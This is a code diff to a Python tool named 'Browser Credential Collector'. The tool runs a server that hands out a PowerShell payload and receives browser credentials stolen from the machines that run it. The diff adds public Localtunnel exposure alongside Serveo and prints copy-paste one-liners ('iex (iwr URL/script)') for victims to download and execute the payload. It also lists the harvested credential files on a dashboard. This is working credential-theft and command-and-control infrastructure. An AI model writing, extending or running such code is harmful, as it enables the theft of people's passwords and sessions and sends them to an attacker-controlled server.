@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os, json, base64, datetime, socket, re, uuid, time, sys, platform
 import subprocess
 import threading
@@ -31,7 +30,10 @@ SERVER_PORT = 5000
 SAVE_DIRECTORY = 'credentials'
 POWERSHELL_SCRIPT = "local.ps1"  # PowerShell script to update
 USE_SERVEO = True  # Enable Serveo tunneling
+USE_LOCALTUNNEL = True  # Enable Localtunnel tunneling
 PUBLIC_URL = None  # Will be populated with Serveo's URL
+LOCALTUNNEL_URL = None  # Will be populated with Localtunnel's URL
+LOCALTUNNEL_SUBDOMAIN = None  # Optional custom subdomain for localtunnel
 
 valid_tokens = {}
 
@@ -65,6 +67,10 @@ rate_limit_counters = defaultdict(list)  # IP -> [timestamp1, timestamp2, ...]
 # Serveo process handler
 serveo_process = None
 serveo_log = []
+
+# Localtunnel process handler
+localtunnel_process = None
+localtunnel_log = []
 
 try:
     from Crypto.Cipher import AES
@@ -259,10 +265,14 @@ def render_dashboard():
     print(f"  • Local URL:     http://localhost:{SERVER_PORT}")
     print(f"  • Network URL:   http://{local_ip}:{SERVER_PORT}")
     if USE_SERVEO and PUBLIC_URL:
-        print(f"  • {Colors.GREEN}Public URL:    {PUBLIC_URL}{Colors.ENDC}")
+        print(f"  • {Colors.GREEN}Serveo URL:    {PUBLIC_URL}{Colors.ENDC}")
+    if USE_LOCALTUNNEL and LOCALTUNNEL_URL:
+        print(f"  • {Colors.GREEN}Localtunnel:   {LOCALTUNNEL_URL}{Colors.ENDC}")
     print(f"  • Script URL:    http://{local_ip}:{SERVER_PORT}/script")
     if USE_SERVEO and PUBLIC_URL:
-        print(f"  • {Colors.GREEN}Public Script: {PUBLIC_URL}/script{Colors.ENDC}")
+        print(f"  • {Colors.GREEN}Serveo Script: {PUBLIC_URL}/script{Colors.ENDC}")
+    if USE_LOCALTUNNEL and LOCALTUNNEL_URL:
+        print(f"  • {Colors.GREEN}LT Script:     {LOCALTUNNEL_URL}/script{Colors.ENDC}")
     print(f"  • Storage Path:  {os.path.abspath(SAVE_DIRECTORY)}")
     print(f"  • Current Time:  {current_time}")
     print()
@@ -300,6 +310,12 @@ def render_dashboard():
             print(f"  {entry}")
         print()
     
+    if USE_LOCALTUNNEL and localtunnel_log:
+        print(f"{Colors.BOLD}Localtunnel Status:{Colors.ENDC}")
+        for entry in localtunnel_log[-3:]:  # Show last 3 Localtunnel related logs
+            print(f"  {entry}")
+        print()
+    
     print(f"{Colors.BOLD}Collected Credential Files:{Colors.ENDC}")
     if credential_files:
         for i, file_info in enumerate(credential_files[-10:], 1):  # Show last 10 files
@@ -322,6 +338,19 @@ def render_dashboard():
         print()
     
     print(f"{Colors.BOLD}Status: {Colors.GREEN}Running{Colors.ENDC} - Press Ctrl+C to stop the server")
+    
+    # Show run commands for easy copying
+    if USE_SERVEO and PUBLIC_URL:
+        print("\n" + "=" * 64)
+        print(f"{Colors.BOLD}Serveo Commands:{Colors.ENDC}")
+        print(f"  {Colors.CYAN}PowerShell: {Colors.GREEN}iex (iwr {PUBLIC_URL}/script){Colors.ENDC}")
+        print(f"  {Colors.CYAN}CMD:        {Colors.GREEN}powershell -c \"iex (iwr {PUBLIC_URL}/script)\"{Colors.ENDC}")
+    
+    if USE_LOCALTUNNEL and LOCALTUNNEL_URL:
+        print("\n" + "=" * 64)
+        print(f"{Colors.BOLD}Localtunnel Commands:{Colors.ENDC}")
+        print(f"  {Colors.CYAN}PowerShell: {Colors.GREEN}iex (iwr {LOCALTUNNEL_URL}/script){Colors.ENDC}")
+        print(f"  {Colors.CYAN}CMD:        {Colors.GREEN}powershell -c \"iex (iwr {LOCALTUNNEL_URL}/script)\"{Colors.ENDC}")
 
 # Log handling
 log_entries = []
@@ -335,7 +364,7 @@ def get_recent_logs(count=5):
     """Get the most recent log entries"""
     return log_entries[-count:] if log_entries else []
 
-def get_powershell_script_with_token(token):
+def get_powershell_script_with_token(token, server_url=None):
     """Read the PowerShell script and replace both the DEFAULT_TOKEN_VALUE and SERVER_URL_PLACEHOLDER"""
     try:
         if not os.path.exists(POWERSHELL_SCRIPT):
@@ -344,12 +373,15 @@ def get_powershell_script_with_token(token):
         with open(POWERSHELL_SCRIPT, 'r') as f:
             content = f.read()
         
-        # Determine which URL to use for the PowerShell script
-        if USE_SERVEO and PUBLIC_URL:
-            server_url = f"{PUBLIC_URL}/receive_credentials"
-        else:
-            local_ip = get_local_ip()
-            server_url = f"http://{local_ip}:{SERVER_PORT}/receive_credentials"
+        # Determine which URL to use for the PowerShell script if not provided
+        if not server_url:
+            if USE_SERVEO and PUBLIC_URL:
+                server_url = f"{PUBLIC_URL}/receive_credentials"
+            elif USE_LOCALTUNNEL and LOCALTUNNEL_URL:
+                server_url = f"{LOCALTUNNEL_URL}/receive_credentials"
+            else:
+                local_ip = get_local_ip()
+                server_url = f"http://{local_ip}:{SERVER_PORT}/receive_credentials"
         
         # Replace both placeholders
         if "DEFAULT_TOKEN_VALUE" in content and "SERVER_URL_PLACEHOLDER" in content:
@@ -444,8 +476,17 @@ class CredentialServerHandler(BaseHTTPRequestHandler):
                 # Generate a new token for this request
                 token = generate_one_time_token()
                 
+                # Determine URL source based on headers if possible
+                server_url = None
+                referer = self.headers.get('Referer', '')
+                if referer:
+                    if USE_SERVEO and PUBLIC_URL and PUBLIC_URL in referer:
+                        server_url = f"{PUBLIC_URL}/receive_credentials"
+                    elif USE_LOCALTUNNEL and LOCALTUNNEL_URL and LOCALTUNNEL_URL in referer:
+                        server_url = f"{LOCALTUNNEL_URL}/receive_credentials"
+                
                 # Get the PowerShell script with the token
-                script_content, error = get_powershell_script_with_token(token)
+                script_content, error = get_powershell_script_with_token(token, server_url)
                 
                 if error:
                     self._set_response(500, 'text/plain')
@@ -668,11 +709,6 @@ def serveo_tunnel_reader(process):
                 PUBLIC_URL = url
                 serveo_log.append(f"{Colors.GREEN}Serveo tunnel established: {Colors.CYAN}{PUBLIC_URL}{Colors.ENDC}")
                 add_log_entry(f"{Colors.GREEN}Serveo tunnel established: {Colors.CYAN}{PUBLIC_URL}{Colors.ENDC}")
-                add_log_entry(f"{Colors.GREEN}\n\nYou can now run in powershell{Colors.ENDC}")
-                add_log_entry(f"{Colors.CYAN}iex (iwr {PUBLIC_URL}/script)\n\n{Colors.ENDC}")
-                add_log_entry(f"{Colors.GREEN}\n\nYou can now run in CMD{Colors.ENDC}")
-                add_log_entry(f"{Colors.CYAN}powershell -c iex (iwr {PUBLIC_URL}/script)\n\n{Colors.ENDC}")
-
 
             # Update the display any time we get output
             render_dashboard()
@@ -680,6 +716,41 @@ def serveo_tunnel_reader(process):
         except Exception as e:
             serveo_log.append(f"{Colors.RED}Error reading Serveo output: {str(e)}{Colors.ENDC}")
             add_log_entry(f"{Colors.RED}Error reading Serveo output: {str(e)}{Colors.ENDC}")
+            render_dashboard()
+            break
+
+def localtunnel_reader(process):
+    """Read and process output from Localtunnel process"""
+    global LOCALTUNNEL_URL
+    
+    while True:
+        try:
+            line = process.stdout.readline()
+            if not line:
+                localtunnel_log.append(f"{Colors.RED}Localtunnel closed.{Colors.ENDC}")
+                add_log_entry(f"{Colors.RED}Localtunnel closed unexpectedly.{Colors.ENDC}")
+                break
+                
+            line = line.decode('utf-8').strip()
+            
+            # Add all output to the log
+            if line:
+                localtunnel_log.append(f"{Colors.BLUE}Localtunnel: {Colors.ENDC}{line}")
+            
+            # Look for the URL in the output
+            if 'your url is:' in line.lower():
+                url = line.split('your url is:')[1].strip()
+                if url:
+                    LOCALTUNNEL_URL = url
+                    localtunnel_log.append(f"{Colors.GREEN}Localtunnel established: {Colors.CYAN}{LOCALTUNNEL_URL}{Colors.ENDC}")
+                    add_log_entry(f"{Colors.GREEN}Localtunnel established: {Colors.CYAN}{LOCALTUNNEL_URL}{Colors.ENDC}")
+            
+            # Update the display any time we get output
+            render_dashboard()
+            
+        except Exception as e:
+            localtunnel_log.append(f"{Colors.RED}Error reading Localtunnel output: {str(e)}{Colors.ENDC}")
+            add_log_entry(f"{Colors.RED}Error reading Localtunnel output: {str(e)}{Colors.ENDC}")
             render_dashboard()
             break
 
@@ -745,31 +816,127 @@ def start_serveo_tunnel(port):
         serveo_process = None
         render_dashboard()
         return False
+
+def start_localtunnel(port, subdomain=None):
+    """Start a Localtunnel for the given port with optional custom subdomain"""
+    global localtunnel_process, LOCALTUNNEL_URL
     
+    try:
+        add_log_entry(f"{Colors.YELLOW}Starting Localtunnel for port {port}...{Colors.ENDC}")
+        localtunnel_log.append(f"{Colors.YELLOW}Starting Localtunnel for port {port}...{Colors.ENDC}")
+        
+        # Check if npx is available
+        try:
+            subprocess.run(['npx', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        except (subprocess.SubprocessError, FileNotFoundError):
+            add_log_entry(f"{Colors.RED}npx not found. Cannot establish Localtunnel. Install Node.js first.{Colors.ENDC}")
+            localtunnel_log.append(f"{Colors.RED}npx not found. Cannot establish Localtunnel. Install Node.js first.{Colors.ENDC}")
+            render_dashboard()
+            return False
+        
+        # Build the command based on whether a subdomain is provided
+        lt_command = ['npx', 'localtunnel', '--port', str(port)]
+        if subdomain:
+            lt_command.extend(['--subdomain', subdomain])
+            add_log_entry(f"{Colors.YELLOW}Requesting custom subdomain: {subdomain}{Colors.ENDC}")
+            localtunnel_log.append(f"{Colors.YELLOW}Requesting custom subdomain: {subdomain}{Colors.ENDC}")
+        
+        # Start Localtunnel process
+        localtunnel_process = subprocess.Popen(
+            lt_command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.DEVNULL
+        )
+        
+        # Start thread to read Localtunnel output
+        threading.Thread(target=localtunnel_reader, args=(localtunnel_process,), daemon=True).start()
+        
+        # Wait briefly for connection
+        time.sleep(2)
+        
+        # Check if process is still running
+        if localtunnel_process.poll() is not None:
+            add_log_entry(f"{Colors.RED}Failed to establish Localtunnel. Process exited with code {localtunnel_process.returncode}{Colors.ENDC}")
+            localtunnel_log.append(f"{Colors.RED}Failed to establish Localtunnel. Process exited with code {localtunnel_process.returncode}{Colors.ENDC}")
+            localtunnel_process = None
+            render_dashboard()
+            return False
+        
+        # Success (even if we don't have the URL yet, the process is running)
+        if not LOCALTUNNEL_URL:
+            add_log_entry(f"{Colors.YELLOW}Localtunnel process started, waiting for URL...{Colors.ENDC}")
+            localtunnel_log.append(f"{Colors.YELLOW}Localtunnel process started, waiting for URL...{Colors.ENDC}")
+        
+        render_dashboard()
+        return True
+    
+    except Exception as e:
+        add_log_entry(f"{Colors.RED}Error establishing Localtunnel: {str(e)}{Colors.ENDC}")
+        localtunnel_log.append(f"{Colors.RED}Error establishing Localtunnel: {str(e)}{Colors.ENDC}")
+        localtunnel_process = None
+        render_dashboard()
+        return False
+
 def stop_serveo_tunnel():
     """Stop the Serveo SSH tunnel if it's running"""
     global serveo_process, PUBLIC_URL
     
     if serveo_process:
         try:
-            # Send SIGTERM to the process group
-            os.killpg(os.getpgid(serveo_process.pid), signal.SIGTERM)
-        except:
-            # If that fails, try direct termination
+            # Try to send SIGTERM to the process group (Unix systems)
             try:
-                serveo_process.terminate()
-                serveo_process.wait(timeout=2)
-            except:
-                # If termination fails, force kill
+                os.killpg(os.getpgid(serveo_process.pid), signal.SIGTERM)
+            except (AttributeError, OSError):
+                # If that fails, try direct termination
                 try:
-                    serveo_process.kill()
+                    serveo_process.terminate()
+                    serveo_process.wait(timeout=2)
                 except:
-                    pass
+                    # If termination fails, force kill
+                    try:
+                        serveo_process.kill()
+                    except:
+                        pass
+        except:
+            pass
         
         serveo_process = None
         PUBLIC_URL = None
         add_log_entry(f"{Colors.YELLOW}Serveo tunnel stopped.{Colors.ENDC}")
         serveo_log.append(f"{Colors.YELLOW}Serveo tunnel stopped.{Colors.ENDC}")
+        render_dashboard()
+        return True
+    
+    return False
+
+def stop_localtunnel():
+    """Stop the Localtunnel if it's running"""
+    global localtunnel_process, LOCALTUNNEL_URL
+    
+    if localtunnel_process:
+        try:
+            # Try to send SIGTERM to the process group (Unix systems)
+            try:
+                os.killpg(os.getpgid(localtunnel_process.pid), signal.SIGTERM)
+            except (AttributeError, OSError):
+                # If that fails, try direct termination
+                try:
+                    localtunnel_process.terminate()
+                    localtunnel_process.wait(timeout=2)
+                except:
+                    # If termination fails, force kill
+                    try:
+                        localtunnel_process.kill()
+                    except:
+                        pass
+        except:
+            pass
+        
+        localtunnel_process = None
+        LOCALTUNNEL_URL = None
+        add_log_entry(f"{Colors.YELLOW}Localtunnel stopped.{Colors.ENDC}")
+        localtunnel_log.append(f"{Colors.YELLOW}Localtunnel stopped.{Colors.ENDC}")
         render_dashboard()
         return True
     
@@ -781,17 +948,25 @@ def cleanup():
     if USE_SERVEO:
         stop_serveo_tunnel()
     
+    # Stop Localtunnel if running
+    if USE_LOCALTUNNEL:
+        stop_localtunnel()
+    
     print(f"\n{Colors.YELLOW}Cleaning up and exiting...{Colors.ENDC}")
     print(f"{Colors.GREEN}Thank you for using Browser Credential Collector!{Colors.ENDC}")
 
 def run_server(host, port):
-    """Run the HTTP server with optional Serveo tunnel"""
+    """Run the HTTP server with optional tunnels"""
     server_address = (host, port)
     httpd = HTTPServer(server_address, CredentialServerHandler)
     
     # Start Serveo tunnel if enabled
     if USE_SERVEO:
         start_serveo_tunnel(port)
+    
+    # Start Localtunnel if enabled
+    if USE_LOCALTUNNEL:
+        start_localtunnel(port, LOCALTUNNEL_SUBDOMAIN)
     
     # Initial dashboard render
     render_dashboard()
@@ -824,12 +999,16 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Browser Credential Collector')
     parser.add_argument('--port', type=int, default=SERVER_PORT, help='Port to listen on')
     parser.add_argument('--no-serveo', action='store_true', help='Disable Serveo tunneling')
+    parser.add_argument('--no-localtunnel', action='store_true', help='Disable Localtunnel tunneling')
+    parser.add_argument('--lt-subdomain', type=str, help='Custom subdomain for Localtunnel (may not be available)')
     parser.add_argument('--clear-blocked', action='store_true', help='Clear blocked IPs on startup')
     
     args = parser.parse_args()
     
     SERVER_PORT = args.port
     USE_SERVEO = not args.no_serveo
+    USE_LOCALTUNNEL = not args.no_localtunnel
+    LOCALTUNNEL_SUBDOMAIN = args.lt_subdomain
     
     if args.clear_blocked:
         print(f"{Colors.YELLOW}Clearing blocked IPs on startup{Colors.ENDC}")
